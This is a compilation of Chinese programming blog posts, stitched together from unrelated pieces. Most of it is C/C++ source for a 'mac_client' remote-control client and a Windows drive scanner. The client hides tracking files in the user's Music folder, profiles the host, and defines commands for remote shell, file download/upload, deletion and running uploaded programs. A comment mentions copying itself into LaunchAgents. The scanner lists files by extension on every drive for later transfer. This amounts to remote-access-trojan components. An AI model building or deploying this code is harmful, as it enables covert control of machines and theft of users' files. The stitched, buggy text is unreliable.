            }

            if(IsDir(buffer))
            {
                Search_File(buffer,name);
            }
            else
            {
                //find the file,if exist
                if(strcmp(dir_entry->d_name,name)==0)
                {
                    printf("%sn",buffer);
                    search_flag=1;

                }
            }
        }

    }

    closedir(directory);

}

void setOutFiles(const char * path)//得到指定目录下面所有文件, 传输的时候还得改
{
    DIR *dp;
    struct dirent *dirp;
    char fullpath[MAX_PATH] = {0};
    if((dp = opendir(path)) == NULL)
    {
        //err_quit();
        return ;
    }

    if (strcmp(path,"/") == 0) //如果是根目录，要处理一下
    {
        while((dirp = readdir(dp))!= NULL)
        {

            sprintf(fullpath,"%s%s", path,dirp->d_name);
            printf("%s\n",fullpath);

        }

    }
    else
    {

        while((dirp = readdir(dp))!= NULL)
        {

            sprintf(fullpath,"%s/%s", path,dirp->d_name);
            printf("%s\n",fullpath);

        }
    }


}






 
 
搭建传输的socket平台参考下面博文：
 
http://blog.csdn.net/wangyaninglm/article/details/41940287
 






控制集成系统需要了解系统的各项硬件信息，之前我们设计的时候，习惯使用c函数来搞，后来可能发现程序的移植性收到了一些影响，比如unix内核的一些c函数在linux下面是没有的：
比如
 
苹果达尔文内核的如下东西，linux里面就没有：
 
 //kern_return_t kr;
    //host_name_port_t myhost;
   // kernel_version_t kversion;
   // host_basic_info_data_t hinfo;
   // mach_msg_type_number_t count;
    char            *cpu_type_name,*cpu_subtype_name;
   // vm_size_t  page_size;
   // myhost = mach_host_self();
   // kr = host_kernel_version(myhost, kversion);
   // count = HOST_BASIC_INFO_COUNT;
   // kr = host_info(myhost, HOST_BASIC_INFO, (host_info_t)&hinfo, &count);
   // kr = host_page_size(myhost, &page_size);                                               //
 
所以换一种思路我们考虑使用，shell命令获取信息，完后进行字符处理，这样即使换了系统，我们代码里面换换shell命令就可以了。
 
使用到的一些结构体跟宏定义：
 
 
//  Created by mac mac on 13-5-8.
//  Copyright (c) 2013年 __MyCompanyName__. All rights reserved.
//

#ifndef mac_client_mac_h
#define mac_client_mac_h
////////////////////////////////////////////////////////////////////////////////////////
/*
1.注意中文标点，编译器不容易察觉
2.server 和client端的宏定义大小要统一
*/
/////////////////////////////////////////////////////////////////////////////////////////
#define MAX_SIZE 1024
#define MAX_NAME_LENGTH 64
#define MAX_PATH 260            //保持和windows端定义的一样
#define MAX_PATH_MAC 256       //苹果的最大长度
#define FALSE 0
#define TRUE 1

#define MAX_SEND_BUFFER 1024*4
#define MAX_RECV_BUFFER 1024*4

/////////////////////////////////////////////////////////////////////////////////////////



typedef struct Command //自定义命令结构体
{
    int order;//命令序号
    long datasize;
    void * hwnd;//窗口句柄
    
}Command;
 

typedef struct Server_Address //服务器地址
{
    
    char strIP[3][MAX_PATH];//服务器ip
    unsigned int uPort[3] ; //服务器端口
    char remark[MAX_NAME_LENGTH];
}Server_Address;


typedef struct _SYS_INFO //到时候得增加备注
{
    Command         cmd;
    char            remark[MAX_NAME_LENGTH];            //备注
    char            computer_name[MAX_NAME_LENGTH];     //
    char            user_name[MAX_NAME_LENGTH];         //
    char            sys_version[MAX_NAME_LENGTH];       //
    char            cpu_type[MAX_NAME_LENGTH];          //
    char            host_ip_address[MAX_NAME_LENGTH];   //内网ip
    char            ip_addresss[MAX_NAME_LENGTH];       //外网ip
    char            uuid[MAX_NAME_LENGTH];             //被控端的唯一标识
    
    unsigned int    cpu_num;                            //
    unsigned int    mem_total;                          //
    int             host_id;                            //
}SYS_INFO;




enum 
{
    COMMAND_BIGIN = 20000,     //命令开始
    TOKEN_ONLINE,              //上线命令
    COMMAND_BREAK,             //断开链接
    COMMAND_UNINSTALL,         //卸载　
    COMMAND_MODIFY_REMARK,     //修改备注
///////////////////////////////////////////////////////////////////////////
    COMMAND_MANAGER_FILE,           //打开文件管理窗口
    COMMAND_GET_DIRECTORY,          //获取控制端主机根目录下所有文件信息 
    COMMAND_GET_REQUEST_DIRECTORY,  //获取双击请求目录中所有文件信息
    COMMAND_SEARCH_FILE,            //文件搜索，还没做
    COMMAND_WRONG_DIRECTORY,        //目录为空或者不可读
    COMMAND_DELETE_FILE,            //删除文件
    COMMAND_FILE_CLOSE,             //关闭当前文件管理功能的链接
//////////////////////////////////////////////////////////////////////////
    
    COMMAND_MANAGER_CMD,    //打开cmd管理窗口
    TOKEN_CMD_NEXT,         //等待下一个命令
    COMMAND_SHELL,          //控制端请求的shell命令
    COMMAND_SHELL_CLOSE,    //关闭shell
////////////////////////////////////////////////////////////////////////// 
    COMMAND_MANAGER_DOWNLOAD,   //打开文件下载功能
    TOKEN_DOWNLOAD_SETUP,   //控制端发送文件下载连接和uuid
    COMMAND_GET_FILEDATA,   //请求文件数据
    TOKEN_SENT_FILEDATA,    //发送文件数据
    TOKEN_CANT_GET_DATA,    //给控制端发送消息文件不可读
////////////////////////////////////////////////////////////////////////
    COMMAND_MANAGER_UPLOAD,     //开启文件上传
    TOKEN_UPLOAD_SETUP,         //接受文件上传连接
    COMMAND_SENT_UPLOAD_DATA,   //发送上传文件数据
    TOKEN_UPLOAD_DATA,          //请求上传文件数据
    TOKEN_UPLOAD_COMPLETE,      //文件上传完成
    COMMAND_RUN_PROGARM,        //上传运行的文件
    
    COMMAND_UPLOAD_CLOSE,      //关闭上传进程和连接
    
    
 };



#endif


 
 
下面是代码：
Systeminfo.h
 
/*
 * File:   System_Info.h
 * Author: Administrator
 *
 * Created on
 */

#ifndef SYSTEM_INFO_H
#define	SYSTEM_INFO_H
#include <iostream>
#include <stdlib.h>
#include <string.h>

#include <netinet/in.h>    // for sockaddr_in
#include <sys/types.h>    // for socket
#include <sys/socket.h>    // for socket
#include <stdio.h>        // for printf
#include <stdlib.h>        // for exit

#include <netdb.h>
#include <pthread.h>      //for th/Users/twd/Desktop/NewPc/mainread
#include <stdbool.h>     //for bool
#include <iconv.h>		//for utf-8 gb2312
#include <sys/cdefs.h>
#include <sys/errno.h>
#include <sys/stat.h>   //for dir
#include <unistd.h>
#include <dirent.h>
#include <arpa/inet.h>			//honts, inet_addr
#include <ctype.h>			//isdigit
#include <errno.h>			//errno
#include <fcntl.h>		//OWRONLY
#include <unistd.h>
#include <pwd.h>        //for username
//#include <copyfile.h>
//#include <mach/host_info.h>
#include <netdb.h>
#include <grp.h>
#include "mac.h"
//#include <mach/mach.h>


#include <sys/mount.h>
using namespace std;



int   GetDeviceInfo(SYS_INFO  * si);//声明一下,传递一个结构体到引用
void writeBeizhuInfo(char *beizhu);//写备份文件
char * readUuidInfo(SYS_INFO*  si);//读取生成的uuid
char * readUuid();
void  writeUuidInfo_info();
bool GetHost(char *domainName,char * ip);

char * readDirectory(char * directory);//上传文件的目录

int myexec(const char *cmd, string &resvec);//管道运行命令,得到一些系统信息

#endif	/* SYSTEM_INFO_H */



实现：
//
//  SystemInfo.cpp
//  mac_client
//
//  Created by mac mac on 13-5-21.
//  Copyright (c) 2013年 __MyCompanyName__. All rights reserved.
//

//#ifdef	__cplusplus
//extern "C" {
//#endif

//#include <iostream>

#include "SystemInfo.h"
#include <stdlib.h>

int beizhuaccess = 0;  //标志位，备注有没有改变

bool GetHost(char *domainName,char * ip)
{


    int i;
    struct hostent *he;
    struct in_addr **addr_list;


    //char * name = "www.csdn.net";

    if ((he = gethostbyname(domainName)) == NULL)
    {  // get the host info
        herror("gethostbyname");
        return NULL;
    }


    // print information about this host:
    printf("Official name is: %s\n", he->h_name);
    printf("    IP addresses: ");
    addr_list = (struct in_addr **)he->h_addr_list;

    for(i = 0; addr_list[i] != NULL; i++)
    {
        printf("%s ", inet_ntoa(*addr_list[i]));
        sprintf(ip, "%s",inet_ntoa(*addr_list[i]));
    }

    ///return
    printf("\n");


    return ip;
}


void  get_ip(SYS_INFO*  si)
{
    //char hname[128];
    struct hostent *hent;
    int i;

    gethostname(si->host_ip_address, sizeof(si->host_ip_address));

    //hent = gethostent();
    hent = gethostbyname(si->host_ip_address);

    printf("hostname: %s/naddress list: ", hent->h_name);
    for(i = 0; hent->h_addr_list[i]; i++)
    {
        printf("%s/t", inet_ntoa(*(struct in_addr*)(hent->h_addr_list[i])));
        memcpy(si->host_ip_address, inet_ntoa(*(struct in_addr*)(hent->h_addr_list[i])), sizeof(si->host_ip_address));
        printf("%s\n",si->host_ip_address);
    }
}


char * readDirectory(char * directory)
{

    char *login_name = (char *)malloc(MAX_NAME_LENGTH * sizeof(char));

    struct passwd *pwd;
    pwd = getpwuid(getuid());
    login_name = pwd->pw_name;		//获取当前用户名

    //char path[MAX_NAME_LENGTH];

    sprintf(directory,"/Users/%s/Library/Music",login_name);//创建的路径
    //sprintf(directory,zhuliuPath,login_name);
    return directory;
}


char * readUuid()
{
    char path[MAX_PATH] = {0};
    char *uuid = (char *)malloc(MAX_PATH_MAC);

    char *login_name = (char *)malloc(MAX_NAME_LENGTH * sizeof(char));

    struct passwd *pwd;
    pwd = getpwuid(getuid());
    login_name = pwd->pw_name;		//获取当前用户名


    sprintf(path,"/Users/%s/Library/Music",login_name);//创建的路径
    //sprintf(path,zhuliuPath,login_name);


    strcat(path, "/uuid.lol");
    //if (access(path,0)==0)
    //{
    FILE *fp = fopen(path, "r");
    fgets(uuid,MAX_NAME_LENGTH,fp);
    fclose(fp);


    return  uuid;

}

char * readUuidInfo(SYS_INFO*  si)
{
    char path[MAX_PATH] = {0};
    char *uuid = (char *)malloc(MAX_PATH_MAC);

    char *login_name = (char *)malloc(MAX_NAME_LENGTH * sizeof(char));

    struct passwd *pwd;
    pwd = getpwuid(getuid());
    login_name = pwd->pw_name;		//获取当前用户名

//


    sprintf(path,"/Users/%s/Library/Music",login_name);//创建的路径
    //sprintf(path,zhuliuPath,login_name);


    strcat(path, "/uuid.lol");

        FILE *fp = fopen(path, "r");
        fgets(uuid,MAX_NAME_LENGTH,fp);
        fclose(fp);
    strcat(si->uuid, uuid);

    return  uuid;


}


void writeBeizhuInfo(char *beizhu)
{

    char *login_name = (char *)malloc(MAX_NAME_LENGTH * sizeof(char));

    struct passwd *pwd;
    pwd = getpwuid(getuid());
    login_name = pwd->pw_name;		//获取当前用户名
    char path[MAX_PATH] = {0};



    sprintf(path,"/Users/%s/Library/Music",login_name);//创建的路径
    //sprintf(path,zhuliuPath,login_name);
    strcat(path, "/beizhu.lol");
    //if (access(path,0)==0)
    //{
    FILE *fp = fopen(path, "w");
    fputs(beizhu,fp);
    //strcpy(si->remark, beizhu);
    //}
    fclose(fp);
}
int myexec(const char *cmd, string &resvec)
 {
    resvec.clear();
    FILE *pp = popen(cmd, "r"); //建立管道
    if (!pp)
    {
        return -1;
    }
    char tmp[1024]; //设置一个合适的长度，以存储每一行输出
    while (fgets(tmp, sizeof(tmp), pp) != NULL)
     {
        if (tmp[strlen(tmp) - 1] == '\n')
        {
            tmp[strlen(tmp) - 1] = '\0'; //去除换行符
        }
        resvec.append(tmp);
    }
    pclose(pp); //关闭管道
    return resvec.size();
}

void writeUuidInfo_info()
{
    FILE *fp = popen("uuidgen", "r");//打开管道，执行命令,生成uuid
    char buffer[MAX_NAME_LENGTH] = {0};
    while (NULL != fgets(buffer, MAX_NAME_LENGTH, fp)) //逐行读取执行结果并打印
    {
        printf(buffer);
    }
    //fclose(fp);

    char *login_name = (char *)malloc(MAX_NAME_LENGTH * sizeof(char));

    struct passwd *pwd;
    pwd = getpwuid(getuid());
    login_name = pwd->pw_name;		//获取当前用户名
    char path[MAX_PATH] = {0};


   sprintf(path,"/Users/%s/Library/Music",login_name);//创建的路径
    //sprintf(path,zhuliuPath,login_name);
    //*
    // int IsHave=mkdir(path,S_IRWXU|S_IRGRP|S_IXGRP|S_IROTH);//创建LaunchAgents文件夹，把自身拷贝进去
   // if(IsHave<0)//创建新目录
    //{
    //  printf("mkdir failed\n");
    // exit(0);
   // }
    string str_mkdir = "mkdir -p ";
    str_mkdir.append(path);
    string str_mkdir_result;
   myexec(str_mkdir.c_str(),str_mkdir_result);

    strcat(path, "/uuid.lol");
    FILE *fpf = fopen(path, "w");
    int i = fputs(buffer,fpf);

    fclose(fpf);


    pclose(fp);

}


int   GetDeviceInfo(SYS_INFO *si)
{
    char temp[64]={0};
    gethostname(si->computer_name,sizeof(si->computer_name));

    struct passwd *passwd;
    passwd = getpwuid (getuid());
    struct group *group;
    group = getgrgid (passwd->pw_gid);

    sprintf(si->user_name,"%s-%s",group->gr_name,passwd->pw_name);

    string str_kernel;
    myexec("uname -sr",str_kernel);
    cout<<str_kernel<<endl;
    strcat(si->sys_version,str_kernel.c_str());



    string str_cpu;
    myexec("grep \"model name\" /proc/cpuinfo | cut -f2 -d:|head -1",str_cpu);
    cout<<str_cpu<<endl;
    strcat(si->cpu_type,str_cpu.c_str());

    puts(si->computer_name);

    struct hostent *hent;
    int i;

    gethostname(si->host_ip_address, sizeof(si->host_ip_address));

    hent = gethostent();
    //hent = gethostbyname(si->host_ip_address);

    printf("hostname: %s/naddress list: ", hent->h_name);
    for(i = 0; hent->h_addr_list[i]; i++)
    {
        printf("%s/t", inet_ntoa(*(struct in_addr*)(hent->h_addr_list[i])));
        memcpy(si->host_ip_address, inet_ntoa(*(struct in_addr*)(hent->h_addr_list[i])), sizeof(si->host_ip_address));
    }
    printf("%s\n",si->host_ip_address);

    string str_mem_total;
    myexec("free -m |grep \"Mem\" | awk \'{print $2}\'",str_mem_total);
    cout<<str_mem_total<<endl;
    si->mem_total = atoi(str_mem_total.c_str());
   // strcat(si->cpu_type,str_cpu.c_str());



    printf("%s\n",si->user_name);
    printf("%s\n",si->sys_version);
    printf("%s\n",si->cpu_type);
    printf("cpu:%d\n",si->cpu_num);
    printf("memory:%d\n",si->mem_total);

///////////////////////////////////读备注文件//////////////////////////////////////////////////////
    char path[MAX_PATH] = {0};
    char beizhu[MAX_PATH_MAC] = {0};


    sprintf(path,"/Users/%s/Library/Music",passwd->pw_name);//创建的路径
    //sprintf(path,zhuliuPath,passwd->pw_name);
    strcat(path, "/beizhu.lol");
    if (access(path,0)==0)
    {
        FILE *fp = fopen(path, "r");
        fgets(beizhu,MAX_NAME_LENGTH,fp);
        fclose(fp);
        beizhuaccess = 1;

        strcpy(si->remark, beizhu);
    }
    else
    {
        strcpy(si->remark, "default");

    }

///////////////////////////////////////读取uuid////////////////////////////////////////////////////////
    char uuidPath[MAX_PATH] = {0};
    sprintf(uuidPath,"/Users/%s/Library/Music",passwd->pw_name);
    strcat(uuidPath, "/uuid.lol");
     if (access(uuidPath,0)==0)
    {
        readUuidInfo(si);

    }
    else
    {
     writeUuidInfo_info();
     readUuidInfo(si);

    }



/////////////////////////////////////////////////////////////////////////////////////////////
    return 0;
}


//#ifdef	__cplusplus
//}


//#endif


 
 
搭建传输的socket平台参考下面博文：
 
http://blog.csdn.net/wangyaninglm/article/details/41940287
 
 
实现效果：

 
 






#include <windows.h>
#include <iostream>
#include <fstream> 
#include <locale.h>
#include "stdio.h"
#include "OperatingIni.h"

using namespace std;

class ScanDisk //磁盘搜索类
{
public:

	ScanDisk(TCHAR *Expansion,TCHAR *FileName);//构造函数
	~ScanDisk();

   	TCHAR DriveString[MAX_PATH];// 驱动器列表
	TCHAR Driver[MAX_PATH];//驱动器名
	TCHAR Expansion[MAX_PATH];//后缀名
	TCHAR FileName[MAX_PATH];//构造函数使用生成的文件名
	TCHAR Name[MAX_PATH];//还未传送的文件路径
	TCHAR ConfigName[MAX_PATH];//要使用的配置文件名
	DWORD count;//文件个数
	DWORD Transform_count;//已传送文件个数

	CIniReader *Reader;
	CIniWriter *Writer;
	FILE *fp;//文件指针，创建路径文件
public:

TCHAR * GetFirstFile();//得到第一个文件路径
//void ModifyPath(TCHAR *path);//修改路径字符串
void SearchforAllDriver(); //搜索所有驱动器
void GetDriverList();//得到驱动器列表
bool Search(TCHAR *Path,TCHAR *File);//递归搜索
bool TcharMarch(TCHAR *fileName,TCHAR *Extension);//文件后缀名匹配
void SetExpansion(TCHAR *Expansion);//设置新的文件后缀
void SetConfigName(TCHAR *ConfigName);//设置需要操作的配置文件名
void InitOperateIni(TCHAR *ConfigName);//初始化配置信息类
void GetAllExpansion();//得到所有后缀名并且检索目录写入文件
};

ScanDisk::ScanDisk(TCHAR *Expansion,TCHAR *FileName)//初始化工作
{
	memset(this->DriveString,0,sizeof(this->DriveString));
	memset(this->Driver,0,sizeof(this->Driver));
	memset(this->Expansion,0,sizeof(this->Expansion));
	memset(this->FileName,0,sizeof(this->FileName));
	memset(this->Name,0,sizeof(this->Name));
	memset(this->ConfigName,0,sizeof(this->ConfigName));
	this->count=0;//文件个数
	this->Transform_count=0;//已传送文件个数为0

	memcpy(this->Expansion,Expansion,wcslen(Expansion)*2);
	memcpy(this->FileName,FileName,wcslen(FileName)*2);
	//MessageBox(NULL,this->FileName,NULL,MB_OK);
//	MessageBox(NULL,this->Expansion,NULL,MB_OK);

}

ScanDisk::~ScanDisk()
{
	fclose(this->fp);

}

void ScanDisk::SetExpansion(TCHAR *Expansion)
{
	memset(this->Expansion,0,sizeof(this->Expansion));
	memcpy(this->Expansion,Expansion,wcslen(Expansion)*2);
}

void ScanDisk::SetConfigName(TCHAR *ConfigName)
{
	memset(this->ConfigName,0,sizeof(this->ConfigName));
	memcpy(this->ConfigName,ConfigName,wcslen(ConfigName)*2);
}

void ScanDisk::InitOperateIni(TCHAR *ConfigName)
{
	memset(this->ConfigName,0,sizeof(this->ConfigName));
	memcpy(this->ConfigName,ConfigName,wcslen(ConfigName)*2);
	this->Writer=new CIniWriter(this->ConfigName);
	this->Reader=new CIniReader(this->ConfigName);
	(this->Writer)->WriteInteger(L"Setting",L"count",this->count);
	(this->Writer)->WriteInteger(L"Setting",L"Transform_count",this->Transform_count);
}

void ScanDisk::GetAllExpansion()//读取配置文件中的每一个后缀名，遍历磁盘写入文件
{
	TCHAR *expansion=(this->Reader)->ReadString(L"Setting", L"extension", L"");//此处设计不是很好
	int length=lstrlen(expansion)+1;//没有斜杠零
	int i=0;
	TCHAR temp[MAX_PATH]={0};
	for (int j=0;j<length;j++)
	{

		if (((*expansion)!=L',')&&((*expansion)!=L'\0'))
		{
			memcpy(&temp[i],expansion,sizeof(TCHAR));
			temp[i++];
			expansion++;
		}
		
		if (((*expansion)==L',')||((*expansion)==L'\0'))
		{ 

			temp[i]=L'\0';
			this->SetExpansion(temp);
			this->SearchforAllDriver();
			if ((*expansion)==L'\0')
			{
				break;
			}
			expansion++;
			i=0;
			memset(temp,0,sizeof(temp));
				
		}

	 }
	 

 
 
}


TCHAR * ScanDisk::GetFirstFile()
{
	DWORD number=(this->Reader)->ReadInteger(L"Setting",L"Transform_count",this->Transform_count);//看看读到第几个文件了
	this->fp=_wfopen(this->FileName,L"r"); //读的方式打开
	if(!this->fp) 
	{ 
		cout<<L"Can not open the .txt file"<<endl; 
	}
	else
	{
		cout<<"the file is opened !"<<endl; 
	}
	//TCHAR path[MAX_PATH]={0};
	for (int i=0;i<=number;i++)
	{
			fgetws(this->Name,MAX_PATH,this->fp);//
	}
	//fgetws(this->Name,MAX_PATH,this->fp);//
	this->Name[lstrlen(this->Name)-1]=0;//去掉文件最后的0A
	wprintf(this->Name);
	//MessageBox(NULL,this->Name,NULL,MB_OK);
	this->Transform_count++;
	(this->Writer)->WriteInteger(L"Setting",L"Transform_count",this->Transform_count);
	fclose(this->fp);
	
	return this->Name;

}

void ScanDisk::SearchforAllDriver()
{

	memset(this->Driver,0,sizeof(this->Driver));
	
	this->GetDriverList();
	int driverCount=0;
	TCHAR * pDrive= this->DriveString;
	while( *pDrive )
	{
		pDrive += wcslen( pDrive ) + 1;
		driverCount++;
		
	} 
//	printf("%d\n",driverCount);//总共几个驱动器
	pDrive= this->DriveString;
	
	this->fp=_wfopen(this->FileName,L"a+"); //追加的方式打开
	if(!this->fp) 
	{ 
		cout<<L"Can not open the .txt file"<<endl; 
	}
	else
	{
		cout<<"the file is opened !"<<endl; 
	}
	//for (int i=0;i<driverCount;i++)
	//{
	while( * pDrive )
	{
		memcpy(this->Driver,pDrive,wcslen(this->DriveString)+1);//控制字符长度，和缓冲区
		//MessageBox(NULL,this->Driver,NULL,MB_OK);
		this->Search(this->Driver,this->Expansion);
		fflush(this->fp);
		pDrive=pDrive+wcslen(pDrive)+1;
	}
	//}
	(this->Writer)->WriteInteger(L"Setting",L"count",this->count);

}

void ScanDisk::GetDriverList()
{
	TCHAR	DriveString[MAX_PATH];
	// 前一个字节为令牌，后面的52字节为驱动器跟相关属性
	GetLogicalDriveStrings(sizeof(DriveString), DriveString);
	memcpy(this->DriveString,DriveString,sizeof(this->DriveString));
}


bool ScanDisk::TcharMarch(TCHAR *fileName,TCHAR *Extension)//文件后缀名匹配
{
	int length_of_ext=wcslen(Extension);
	int length_of_name=wcslen(fileName);
	int i=0;
	while(i<length_of_ext)
	{
		if (fileName[i+(length_of_name-length_of_ext)]!=Extension[i])
		{
			return false;
		}
		else
			i++;
	}
	return true;

}

bool ScanDisk::Search(TCHAR *Path,TCHAR *File)
{
	HANDLE hFind;
	WIN32_FIND_DATA wfd;
	
	ZeroMemory(&wfd,sizeof(WIN32_FIND_DATA));
	TCHAR PathTemp[MAX_PATH];
	memset(PathTemp,0,sizeof(PathTemp));

	swprintf(PathTemp,L"%s\\*.*",Path);
	hFind=FindFirstFile(PathTemp,&wfd);

	if(INVALID_HANDLE_VALUE==hFind)
	{
		//MessageBox(NULL,L"INVALID_HANDLE_VALUE",L"FindFirstFile",MB_OK);
		return false;
	}
	
	do
	{
		if('.'==wfd.cFileName[0])
		{
			continue;
		}
		
		if(wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
		{
			swprintf(PathTemp,L"%s\\%s",Path,wfd.cFileName);
			//MessageBox(NULL,PathTemp,"Directory",MB_OK);
			//wprintf(PathTemp);
			//printf("\n");
			Search(PathTemp,File);
			fflush(this->fp);
		}
		else
		{
			
			if (TcharMarch(wfd.cFileName,File))
			{
			
				swprintf(PathTemp,L"%s\\%s",Path,wfd.cFileName);
				//MessageBox(NULL,L"Found",PathTemp,MB_OK);
				//printf(PathTemp);
				//wprintf(PathTemp);
				//printf("\n");
///////////////////////////////////////////////////////////////////////////////////
//				TCHAR temp[MAX_PATH];
//				memcpy(temp," ",sizeof(temp));
//				temp[MAX_PATH-2]=L'\0';
//				memcpy(temp,PathTemp,lstrlen(PathTemp)*2);
//////////////////////////////////////////////////////////////////////////////////
				fwprintf(this->fp,L"%s",PathTemp);
				
				fwprintf(this->fp,L"\n");
				this->count++;//文件个数加1
				
			}
		}
		
	}while(FindNextFile(hFind,&wfd));
	
	FindClose(hFind);
	
	return true;
	
}


这个代码必须在unicode工程下使用，支持中文路径，"OperatingIni.h"//这个头文件,如下所示
 
 
#include <tchar.h>
#include <iostream>
#include <Windows.h>

class CIniReader
{
public:
	CIniReader(TCHAR * szFileName); 
	int ReadInteger(TCHAR* szSection, TCHAR* szKey, int iDefaultValue);
	//float ReadFloat(TCHAR* szSection, TCHAR* szKey, float fltDefaultValue);
	bool ReadBoolean(TCHAR* szSection, TCHAR* szKey, bool bolDefaultValue);
	TCHAR* ReadString(TCHAR* szSection, TCHAR* szKey, const TCHAR* szDefaultValue);
private:
	TCHAR m_szFileName[MAX_PATH];
};

class CIniWriter
{
public:
	CIniWriter(TCHAR* szFileName); 
	void WriteInteger(TCHAR* szSection, TCHAR* szKey, int iValue);
	//void WriteFloat(TCHAR* szSection, TCHAR* szKey, float fltValue);
	void WriteBoolean(TCHAR* szSection, TCHAR* szKey, bool bolValue);
	void WriteString(TCHAR* szSection, TCHAR* szKey, TCHAR* szValue);
	void DeleteString(TCHAR* szSection, TCHAR* szKey);
private:
	TCHAR m_szFileName[MAX_PATH];
};


CIniReader::CIniReader(TCHAR* szFileName)
{
	memset(m_szFileName, 0x00, MAX_PATH);
	memcpy(m_szFileName, szFileName, wcslen(szFileName)*2);//注意此处
}

int CIniReader::ReadInteger(TCHAR* szSection, TCHAR* szKey, int iDefaultValue)
{
	int iResult = GetPrivateProfileInt(szSection,  szKey, iDefaultValue, m_szFileName); 
	return iResult;
}

//float CIniReader::ReadFloat(TCHAR* szSection, TCHAR* szKey, float fltDefaultValue)
//{
//TCHAR szResult[255];
//TCHAR szDefault[255];
//float fltResult;
//	swprintf(szDefault, L"%f",fltDefaultValue);
//	GetPrivateProfileString(szSection,  szKey, szDefault, szResult, 255, m_szFileName); 
//	fltResult =  atof(szResult);
//	return fltResult;
//}

bool CIniReader::ReadBoolean(TCHAR* szSection, TCHAR* szKey, bool bolDefaultValue)
{
	TCHAR szResult[MAX_PATH];
	TCHAR szDefault[MAX_PATH];
	bool bolResult;
	swprintf(szDefault, L"%s", bolDefaultValue? L"True" : L"False");
	GetPrivateProfileString(szSection, szKey, szDefault, szResult, 255, m_szFileName); 
	bolResult =  (wcscmp(szResult, L"True") == 0 || 
		wcscmp(szResult, L"true") == 0) ? true : false;
	return bolResult;
}

TCHAR* CIniReader::ReadString(TCHAR* szSection, TCHAR* szKey, const TCHAR* szDefaultValue)
{
	TCHAR* szResult = new TCHAR[MAX_PATH];
	memset(szResult, 0x00, MAX_PATH);
	GetPrivateProfileString(szSection,  szKey, 
		szDefaultValue, szResult, MAX_PATH, m_szFileName); 
	return szResult;
}

CIniWriter::CIniWriter(TCHAR* szFileName)
{
	memset(m_szFileName, 0x00, MAX_PATH);
	memcpy(m_szFileName, szFileName, wcslen(szFileName)*2);
}

void CIniWriter::WriteInteger(TCHAR* szSection, TCHAR* szKey, int iValue)
{
	TCHAR szValue[MAX_PATH];
	swprintf(szValue, L"%d", iValue);
	WritePrivateProfileString(szSection,  szKey, szValue, m_szFileName); 
}

//void CIniWriter::WriteFloat(TCHAR* szSection, TCHAR* szKey, float fltValue)
//{
//TCHAR szValue[255];
//swprintf(szValue,L"%f", fltValue);
//WritePrivateProfileString(szSection,  szKey, szValue, m_szFileName); 
//}

void CIniWriter::WriteBoolean(TCHAR* szSection, TCHAR* szKey, bool bolValue)
{
	TCHAR szValue[MAX_PATH];
	swprintf(szValue, L"%s", bolValue ? L"True" : L"False");
	WritePrivateProfileString(szSection,  szKey, szValue, m_szFileName); 
}

void CIniWriter::WriteString(TCHAR* szSection, TCHAR* szKey, TCHAR* szValue)
{
	WritePrivateProfileString(szSection,  szKey, szValue, m_szFileName);
}

void CIniWriter::DeleteString(TCHAR* szSection, TCHAR* szKey)
{
	WritePrivateProfileString(szSection,szKey,NULL,m_szFileName);
}


主函数可以这么写：
#include "ScanDisk.h"
//#include "OperatingIni.h"

int main()
{
	//_wsetlocale设置中文语言环境
	_wsetlocale(LC_ALL,L"chs");
	
	
	

  //*/
	//_wsetlocale设置中文语言环境
//	_wsetlocale(LC_ALL,L"chs");
	
	CIniWriter iniWriter(L".//Log.ini");
	iniWriter.WriteString(L"Setting",L"extension", L".txt");   
	//iniWriter.WriteInteger(L"Setting", L"count", 2); 
	////iniWriter.WriteFloat(L"Setting", L"Height", 1.82f); 
	//iniWriter.WriteBoolean(L"Setting", L"Marriage", false);  
	//iniWriter.WriteBoolean(L"Setting", L"Marriage", NULL); 
	//iniWriter.DeleteString(L"Setting",L"Marriage");
	//iniWriter.WriteString("ff", "Name", "jia");   
	//	iniWriter.WriteInteger("ff", "Age", 8); 
	//iniWriter.WriteFloat("ff", "Height", 1.82f); 
	//iniWriter.WriteBoolean("ff", "Marriage", false); 
	
	CIniReader iniReader(L".//Log.ini");
	
	TCHAR *szName = iniReader.ReadString(L"Setting", L"extension", L"");   
//	int iAge = iniReader.ReadInteger(L"Setting", L"Age", 0); 
	//float fltHieght = iniReader.ReadFloat(L"Setting", L"Height", 1.80f); 
//	bool bMarriage = iniReader.ReadBoolean(L"Setting", L"Marriage", true); 
	
	//std::cout<<L"Name:"<<szName<<std::endl
	//	<<L"Age:"<<iAge<<std::endl 
	//<<L"Height:"<<fltHieght<<std::endl 
	//<<L"Marriage:"<<bMarriage<<std::endl; 
	//wprintf(szName);
//	wprintf(L"\n");
	//wprintf(L"%d\n",iAge);
    _wremove(L"Logger.log");//删除ini文件
	TCHAR *file= L"Logger.log";
	TCHAR *ext=szName;
	ScanDisk sd(ext,file);
	sd.InitOperateIni(L".//Log.ini");
	sd.GetAllExpansion();
	sd.SearchforAllDriver();
	sd.GetFirstFile();
	sd.GetFirstFile();
	//sd.SetExpansion(L".dsp");
	//sd.SearchforAllDriver();
	//sd.GetFirstFile();
//	MessageBox(NULL,sd.GetFirstFile(),NULL,MB_OK);
	


 
	//fclose(fp);
	//fclose(sd.fp);
	system("pause");
	return 0;
}

 
 
 
配置文件：

 
部分搜索结果：

资源下载：
 
http://download.csdn.net/detail/wangyaninglm/8301303
 






代码如下：
#include "stdafx.h"
#include "stdlib.h"
#include <direct.h>
#include <string.h>

int _tmain(int argc, char* argv[])
{
	char* buffer;

	// Get the current working directory: 
	if( (buffer = _getcwd( NULL, 0 )) == NULL )
		perror( "_getcwd error" );
	else
	{
		printf( "%s \nLength: %d\n", buffer, strnlen(buffer,1024) );
		free(buffer);
	}

	FILE *fp = fopen("input_left.ppm", "rb");
	if (!fp) 
	{
		printf("exit");
		return NULL;
	}
	else
	{
		printf("get");
	}

	getchar();


	return 0;
}



 









我们在做数据分析，清洗的过程中，很多时候会面对各种各样的数据源，要针对不同的数据源进行清洗，入库的工作。当然python这个语言，我比较喜欢，开发效率高，基本上怎么写都能运行，而且安装配置简单，基本上有网的环境pip install全部都搞定，没网的话，把whl包copy过来一行命令也就解决了( windows下python3.5使用pip离线安装whl包)。
本篇博客就针对，在windows平台下使用python3（python2社区将要停止支持，使用3是大势所趋），读取xls，xlsx格式的数据进行清洗入库做一个小例子。
初步业务流程
整个业务的流程十分简单：两个大的步骤
1. 读取xlsx数据进行清洗
2. cx_Oracle批量入库

 

建表语句：
create table temp_table
(
importtime varchar2(128),
carrier varchar2(32),

);

select * from temp_table
